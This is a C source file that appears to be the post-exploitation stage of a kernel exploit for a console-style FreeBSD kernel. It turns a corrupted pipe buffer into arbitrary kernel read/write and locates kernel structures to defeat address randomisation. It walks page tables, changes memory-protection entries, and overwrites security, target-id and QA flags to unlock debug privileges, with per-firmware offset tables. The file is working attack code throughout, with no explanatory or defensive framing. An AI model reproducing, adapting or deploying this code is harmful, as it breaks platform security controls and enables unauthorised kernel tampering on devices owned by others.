#include "kernel.h"
#include "api.h"
#include "iommu.h"
#include "logger.h"
#include <elf.h>

kaddrs_t kaddrs = {0};
karw_ctx_t karw_ctx = {0};

void init_karw(kexp_args_t *args) {
  log("init karw started...");

  karw_ctx.master_pipe[0] = args->master_pipe[0];
  karw_ctx.master_pipe[1] = args->master_pipe[1];
  karw_ctx.victim_pipe[0] = args->victim_pipe[0];
  karw_ctx.victim_pipe[1] = args->victim_pipe[1];

  karw_ctx.pipebuf.in = 0;
  karw_ctx.pipebuf.out = 0;
  karw_ctx.pipebuf.size = PAGE_SIZE;

  log("init karw completed !!");
}

void init_kaddrs(uintptr_t allproc) {
  log("init kaddrs started...");

  kaddrs.allproc = allproc;

  find_dyn_segment();
  find_hash_table();
  find_kmdp();

  log("kaddrs { ktext: %#lx ksize: %#lx kaslr: %#lx kdata: %#lx krodata: "
      "%#lx kmdp: %#lx allproc: %#lx }",
      kaddrs.ktext, kaddrs.ksize, kaddrs.kaslr, kaddrs.kdata, kaddrs.krodata,
      kaddrs.kmdp, kaddrs.allproc);

  log("init kaddrs completed !!");
}

void find_dyn_segment() {
  Elf64_Dyn dyn[6];

  log("find dyn segment started...");

  uintptr_t vaddr = ALIGN_DOWN(kaddrs.allproc, 0x1000);
  while (1) {
    kread(&dyn, vaddr, sizeof(dyn));

    for (int i = 0; i < 2; i++) {
      if (dyn[i].d_tag == DT_SYMTAB && dyn[i + 1].d_tag == DT_SYMENT &&
          dyn[i + 2].d_tag == DT_STRTAB && dyn[i + 3].d_tag == DT_STRSZ &&
          dyn[i + 4].d_tag == DT_HASH) {
        log("found dyn segment at %#lx !!", vaddr);
        kaddrs.kdata = vaddr;
        kaddrs.krodata = dyn[i + 4].d_un.d_ptr;
        goto found;
      }
    }

    vaddr -= 0x1000;
  }

found:
  log("find dyn segment completed !!");
}

void find_hash_table() {
  uint32_t elf_hash[4];

  log("find hash table started...");

  uintptr_t vaddr = ALIGN_DOWN(kaddrs.kdata, 0x1000);
  while (1) {
    kread(elf_hash, vaddr, sizeof(elf_hash));

    uint32_t elf_hash_nbucket = elf_hash[0];
    uint32_t elf_hash_nchain = elf_hash[1];
    uint32_t elf_hash_bucket = elf_hash[2];
    uint32_t elf_hash_chain = elf_hash[3];

    if (elf_hash_nbucket == 1 && elf_hash_nchain == 1 && elf_hash_bucket == 0 &&
        elf_hash_chain == 0) {
      log("found hash table at %#lx !!", vaddr);
      kaddrs.kaslr = vaddr - kaddrs.krodata;
      kaddrs.krodata = vaddr;
      break;
    }

    vaddr -= 0x1000;
  }

  log("find hash table completed !!");
}

void find_kmdp() {
  char data[0x50];

  log("find kmdp started...");

  uintptr_t vaddr = ALIGN_UP(kaddrs.allproc, 0x1000);
  while (1) {
    kread(data, vaddr, sizeof(data));

    // Module info is at the end.
    if (strcmp(data + 0x08, "kernel") == 0 &&
        strcmp(data + 0x18, "elf kernel") == 0) {
      log("found kmdp at %#lx !!", vaddr);
      kaddrs.kmdp = vaddr;
      kaddrs.ktext = *(uintptr_t *)(data + 0x30);
      kaddrs.ksize = *(uintptr_t *)(data + 0x40);
      break;
    }

    vaddr += 0x1000;
  }

  log("find kmdp completed !!");
}

int flush() {
  if (write(karw_ctx.master_pipe[1], &karw_ctx.pipebuf,
            sizeof(karw_ctx.pipebuf)) == -1)
    return -1;

  if (read(karw_ctx.master_pipe[0], &karw_ctx.pipebuf,
           sizeof(karw_ctx.pipebuf)) == -1)
    return -1;

  return 0;
}

ssize_t kread(void *dst, void *src, uint32_t sz) {
  karw_ctx.pipebuf.buffer = src;
  karw_ctx.pipebuf.cnt = sz;

  if (flush() == -1)
    return -1;

  ssize_t n = read(karw_ctx.victim_pipe[0], dst, sz);
  if (n == -1)
    return -1;

  return n;
}

ssize_t kwrite(void *dst, void *src, uint32_t sz) {
  karw_ctx.pipebuf.buffer = dst;
  karw_ctx.pipebuf.cnt = sz;

  if (flush() == -1)
    return -1;

  ssize_t n = write(karw_ctx.victim_pipe[1], src, sz);
  if (n == -1)
    return -1;

  return n;
}

uintptr_t pfind(pid_t pid) {
  uintptr_t p;
  pid_t p_pid;

  kread(&p, kaddrs.allproc, sizeof(p));

  while (p) {
    kread(&p_pid, p + 0xbc, sizeof(p_pid));

    if (p_pid == pid)
      break;

    kread(&p, p, sizeof(p));
  }

  return p;
}

uintptr_t fget(int fd) {
  uintptr_t fde;

  if (kaddrs.fdt_ofiles == 0) {
    uintptr_t p_fd;
    uintptr_t fd_files;

    uintptr_t p = pfind(getpid());

    kread(&p_fd, p + 0x48, sizeof(p_fd));
    kread(&fd_files, p_fd, sizeof(fd_files));

    kaddrs.fdt_ofiles = fd_files + 8;
  }

  kread(&fde, kaddrs.fdt_ofiles + (fd * FILEDESCENT_SIZE), sizeof(fde));

  return fde;
}

void fhold(uintptr_t fp) {
  uint32_t f_count;

  kread(&f_count, fp + 0x28, sizeof(f_count));

  f_count++;

  kwrite(fp + 0x28, &f_count, sizeof(f_count));
}

uintptr_t get_in6p_outputopts(int fd) {
  uintptr_t f_data;
  uintptr_t so_pcb;
  uintptr_t in6p_outputopts;

  uintptr_t fp = fget(fd);
  kread(&f_data, fp, sizeof(f_data));
  kread(&so_pcb, f_data + 0x18, sizeof(so_pcb));
  kread(&in6p_outputopts, so_pcb + 0x120, sizeof(in6p_outputopts));

  return in6p_outputopts;
}

void remove_pktinfo_from_so(int fd) {
  uintptr_t ip6po_pktinfo;

  uintptr_t in6p_outputopts = get_in6p_outputopts(fd);

  ip6po_pktinfo = 0;

  kwrite(in6p_outputopts + 0x10, &ip6po_pktinfo, sizeof(ip6po_pktinfo));
}

uintptr_t get_dmap(uintptr_t paddr) {
  if (paddr == 0)
    return 0;

  if (kaddrs.dmap == 0)
    return 0;

  return kaddrs.dmap + paddr;
}

uintptr_t get_paddr(uintptr_t vaddr) {
  if (vaddr == 0)
    return 0;

  if (kaddrs.dmap == 0)
    return 0;

  int pml4e_index = (vaddr >> 39) & 0x1FF;
  int pdpe_index = (vaddr >> 30) & 0x1FF;
  int pde_index = (vaddr >> 21) & 0x1FF;
  int pte_index = (vaddr >> 12) & 0x1FF;

  uintptr_t cr3_dmap = get_dmap(kaddrs.cr3);
  if (cr3_dmap == 0)
    return 0;

  uintptr_t pml4e_vaddr = cr3_dmap + pml4e_index * 8;
  uintptr_t pml4e;

  kread(&pml4e, pml4e_vaddr, sizeof(pml4e));

  if (CPU_PDE_FIELD(pml4e, PRESENT) != 1)
    return 0;

  uintptr_t pdp_paddr = pml4e & CPU_PG_PHYS_FRAME;
  uintptr_t pdp_dmap = get_dmap(pdp_paddr);
  if (pdp_dmap == 0)
    return 0;

  uintptr_t pdpe_vaddr = pdp_dmap + pdpe_index * 8;
  uintptr_t pdpe;

  kread(&pdpe, pdpe_vaddr, sizeof(pdpe));

  if (CPU_PDE_FIELD(pdpe, PRESENT) != 1)
    return 0;

  uintptr_t pd_paddr = pdpe & CPU_PG_PHYS_FRAME;
  uintptr_t pd_dmap = get_dmap(pd_paddr);
  if (pd_dmap == 0)
    return 0;

  uintptr_t pde_vaddr = pd_dmap + pde_index * 8;
  uintptr_t pde;

  kread(&pde, pde_vaddr, sizeof(pde));

  if (CPU_PDE_FIELD(pde, PRESENT) != 1)
    return 0;

  if (CPU_PDE_FIELD(pde, PS) == 1)
    return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffff);

  uintptr_t pt_paddr = pde & CPU_PG_PHYS_FRAME;
  uintptr_t pt_dmap = get_dmap(pt_paddr);
  if (pt_dmap == 0)
    return 0;

  uintptr_t pte_vaddr = pt_dmap + pte_index * 8;
  uintptr_t pte;

  kread(&pte, pte_vaddr, sizeof(pte));

  if (CPU_PDE_FIELD(pte, PRESENT) != 1)
    return 0;

  return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fff);
}

uintptr_t find_vm_pmap_ptr(uintptr_t vmspace) {
  uintptr_t vm_pmap;

  log("find vm_pmap started...");

  for (int offset = 0x1c8; offset <= 0x200; offset += 8) {
    kread(&vm_pmap, vmspace + offset, sizeof(vm_pmap));

    size_t vm_pmap_offset = vm_pmap - vmspace;

    if (vm_pmap_offset >= 0x2c0 && vm_pmap_offset <= 0x2f0) {
      log("found va_mpmap at %#lx !!", vmspace + offset);
      log("find vm_pmap completed !!");
      return vmspace + offset;
    }
  }

  log("unable to find vm_pmap !!");
  return 0;
}

uintptr_t find_openpsid_ptr() {
  char data[0x10];
  char tmp[0x10];

  log("find openpsid start...");

  size_t size = sizeof(data);

  if (sysctlbyname("machdep.openpsid", data, &size, 0, 0) == -1) {
    log("unable to get sysctlbyname !!");
    return 0;
  }

  uintptr_t addr = kaddrs.ktext + kaddrs.ksize - sizeof(tmp);

  while (addr > kaddrs.kdata) {
    kread(tmp, addr, sizeof(tmp));

    if (memcmp(data, tmp, sizeof(data)) == 0) {
      log("found openpsid at %#lx !!", addr);
      log("find openpsid completed !!");
      return addr;
    }

    if (addr < kaddrs.kdata + 8)
      break;

    addr -= 8;
  }

  log("unable to find openpsid !!");
  return 0;
}

uint32_t get_fw_version() {
  uint32_t version;

  size_t size = sizeof(version);

  if (sysctlbyname("kern.sdk_version", &version, &size, 0, 0) == -1) {
    log("unable to get sysctlbyname !!");
    return 0;
  }

  return version;
}

uintptr_t get_kernel_data_base() {
  uintptr_t kernel_data_base = 0;

  uint32_t version = get_fw_version();
  log("fw_version: %#x", version);

  if (version == 0) {
    log("unable to get fw version !!");
    return 0;
  }

  switch (version & 0xffff0000) {
  case 0x1000000:
  case 0x1010000:
  case 0x1020000:
    kernel_data_base = kaddrs.allproc - 0x26D1BF8;
    break;

  case 0x1050000:
  case 0x1100000:
  case 0x1110000:
  case 0x1120000:
  case 0x1130000:
  case 0x1140000:
    kernel_data_base = kaddrs.allproc - 0x26D1C18;
    break;

  case 0x2000000:
  case 0x2200000:
  case 0x2250000:
  case 0x2260000:
  case 0x2300000:
  case 0x2500000:
  case 0x2700000:
    kernel_data_base = kaddrs.allproc - 0x2701C28;
    break;

  case 0x3000000:
  case 0x3100000:
  case 0x3200000:
  case 0x3210000:
    kernel_data_base = kaddrs.allproc - 0x276DC58;
    break;

  case 0x4020000:
  case 0x4000000:
  case 0x4030000:
  case 0x4500000:
  case 0x4510000:
    kernel_data_base = kaddrs.allproc - 0x27EDCB8;
    break;

  case 0x5000000:
  case 0x5020000:
  case 0x5100000:
  case 0x5500000:
    kernel_data_base = kaddrs.allproc - 0x291DD00;
    break;

  case 0x6000000:
  case 0x6020000:
  case 0x6500000:
    kernel_data_base = kaddrs.allproc - 0x2869D20;
    break;

  case 0x7000000:
  case 0x7010000:
  case 0x7200000:
  case 0x7400000:
  case 0x7600000:
  case 0x7610000:
    kernel_data_base = kaddrs.allproc - 0x2859D50;
    break;

  case 0x8000000:
  case 0x8200000:
  case 0x8400000:
  case 0x8600000:
    kernel_data_base = kaddrs.allproc - 0x2875D50;
    break;

  case 0x9000000:
  case 0x9050000:
  case 0x9200000:
  case 0x9400000:
  case 0x9600000:
    kernel_data_base = kaddrs.allproc - 0x2755D50;
    break;

  case 0x10000000:
  case 0x10010000:
  case 0x10200000:
  case 0x10400000:
  case 0x10600000:
    kernel_data_base = kaddrs.allproc - 0x2765D70;
    break;

  case 0x11000000:
  case 0x11200000:
  case 0x11400000:
  case 0x11600000:
    kernel_data_base = kaddrs.allproc - 0x2875D70;
    break;

  case 0x12000000:
  case 0x12020000:
  case 0x12200000:
  case 0x12400000:
  case 0x12600000:
  case 0x12700000:
    kernel_data_base = kaddrs.allproc - 0x2885E00;
    break;

  case 0x13000000:
  case 0x13200000:
    kernel_data_base = kaddrs.allproc - 0x28C5E00;
    break;

  default:
    log("kernel data base defaults to krodata in future...");
    kernel_data_base = kaddrs.krodata;
    break;
  }

  return kernel_data_base;
}

uintptr_t get_vm_map_pmap(uintptr_t p) {
  uintptr_t p_vmspace;
  uintptr_t vm_pmap;

  kread(&p_vmspace, p + 0x200, sizeof(p_vmspace));

  uintptr_t vm_pmap_ptr = find_vm_pmap_ptr(p_vmspace);
  if (vm_pmap_ptr == 0)
    return 0;

  kread(&vm_pmap, vm_pmap_ptr, sizeof(vm_pmap));

  return vm_pmap;
}

uintptr_t get_vm_map_root(uintptr_t p) {
  uintptr_t p_vmspace;
  uintptr_t vm_root;

  kread(&p_vmspace, p + 0x200, sizeof(p_vmspace));

  uintptr_t vm_pmap_ptr = find_vm_pmap_ptr(p_vmspace);
  if (vm_pmap_ptr == 0)
    return 0;

  kread(&vm_root, vm_pmap_ptr - 8, sizeof(vm_root));

  return vm_root;
}

int vm_map_set_protection(uintptr_t vaddr, size_t sz, uint8_t prot) {
  uintptr_t vme = find_vm_map_entry(vaddr);
  if (vme == 0) {
    return -1;
  }

  uint8_t first = 1;
  while (vme) {
    uintptr_t next;
    uintptr_t start;

    kread(&next, vme + 0x08, sizeof(next));
    kread(&start, vme + 0x20, sizeof(start));

    if (start >= vaddr + sz || (start < vaddr && !first))
      break;

    first = 0;

    kwrite(vme + 0x64, &prot, sizeof(prot));

    vme = next;
  }

  return 0;
}

uintptr_t find_vm_map_entry(uintptr_t vaddr) {
  if (vaddr == 0) {
    return 0;
  }

  log("find vm_map_entry started...");

  uintptr_t p = pfind(getpid());
  uintptr_t root = get_vm_map_root(p);
  if (root == 0)
    return 0;

  uintptr_t vme = root;
  while (vme) {
    uintptr_t prev;
    uintptr_t left;
    uintptr_t right;
    uintptr_t start;
    uintptr_t end;

    kread(&prev, vme, sizeof(prev));
    kread(&left, vme + 0x10, sizeof(left));
    kread(&right, vme + 0x18, sizeof(right));
    kread(&start, vme + 0x20, sizeof(start));
    kread(&end, vme + 0x28, sizeof(end));

    if (vaddr < start) {
      if (left == 0) {
        log("found vm_map_entry at %#lx !!", prev);
        return prev;
      }

      vme = left;
    } else if (end > vaddr) {
      return vme;
    } else {
      if (right == 0) {
        log("found vm_map_entry at %#lx !!", vme);
        return vme;
      }

      vme = right;
    }
  }

  log("failed to find vm_map_entry of addr %#lx", vaddr);
  return 0;
}

int patch_qa_flags() {
  uintptr_t security_flags_ptr, target_id_ptr, qa_flags_ptr, utoken_flags_ptr;
  uint32_t security_flags, qa_flags;
  uint8_t target_id, utoken_flags;

  log("patch qa flags started...");

  uint32_t version = get_fw_version();
  log("fw_version: %#x", version);

  if (version == 0) {
    log("unable to get fw version !!");
    return -1;
  }

  if (version >= 0x7000000u) {
    security_flags_ptr = kaddrs.kdata - 0x1000 + 0x64;
    target_id_ptr = kaddrs.kdata - 0x1000 + 0x6D;
    qa_flags_ptr = kaddrs.kdata - 0x1000 + 0x88;
    utoken_flags_ptr = kaddrs.kdata - 0x1000 + 0xf0;
  } else {
    uintptr_t openpsid_ptr = find_openpsid_ptr();
    if (openpsid_ptr == 0) {
      log("unable to find openpsid !!");
      return -1;
    }

    log("openpsid_ptr: %#lx", openpsid_ptr);

    security_flags_ptr = openpsid_ptr - 0x14;
    target_id_ptr = openpsid_ptr - 0xB;
    qa_flags_ptr = openpsid_ptr + 0x10;
    utoken_flags_ptr = openpsid_ptr + 0x78;
  }

  log("qaf ptrs { security_flags: %#lx target_id: %#lx qa_flags: %#lx "
      "utoken_flags: %#lx }",
      security_flags_ptr, target_id_ptr, qa_flags_ptr, utoken_flags_ptr);

  kread(&security_flags, security_flags_ptr, sizeof(security_flags));
  kread(&target_id, target_id_ptr, sizeof(target_id));
  kread(&qa_flags, qa_flags_ptr, sizeof(qa_flags));
  kread(&utoken_flags, utoken_flags_ptr, sizeof(utoken_flags));

  log("qaf before { security_flags: %#x target_id: %#x qa_flags: %#x "
      "utoken_flags: "
      "%#x }",
      security_flags, target_id, qa_flags, utoken_flags);

  security_flags |= 0x14;
  target_id = 0x82;
  qa_flags |= 0x10300;
  utoken_flags |= 1;

  if (version >= 0x7000000u) {
    if (iommu_init() != 0) {
      log("unable to init iommu !!");
      return -1;
    }

    iommu_write(security_flags_ptr, security_flags, sizeof(security_flags));
    iommu_write(target_id_ptr, target_id, sizeof(target_id));
    iommu_write(qa_flags_ptr, qa_flags, sizeof(qa_flags));
    iommu_write(utoken_flags_ptr, utoken_flags, sizeof(utoken_flags));
  } else {
    kwrite(security_flags_ptr, &security_flags, sizeof(security_flags));
    kwrite(target_id_ptr, &target_id, sizeof(target_id));
    kwrite(qa_flags_ptr, &qa_flags, sizeof(qa_flags));
    kwrite(utoken_flags_ptr, &utoken_flags, sizeof(utoken_flags));
  }

  kread(&security_flags, security_flags_ptr, sizeof(security_flags));
  kread(&target_id, target_id_ptr, sizeof(target_id));
  kread(&qa_flags, qa_flags_ptr, sizeof(qa_flags));
  kread(&utoken_flags, utoken_flags_ptr, sizeof(utoken_flags));

  log("qaf after { security_flags: %#x target_id: %#x qa_flags: %#x "
      "utoken_flags: %#x }",
      security_flags, target_id, qa_flags, utoken_flags);

  log("patch qa flags completed !!");

  return 0;
}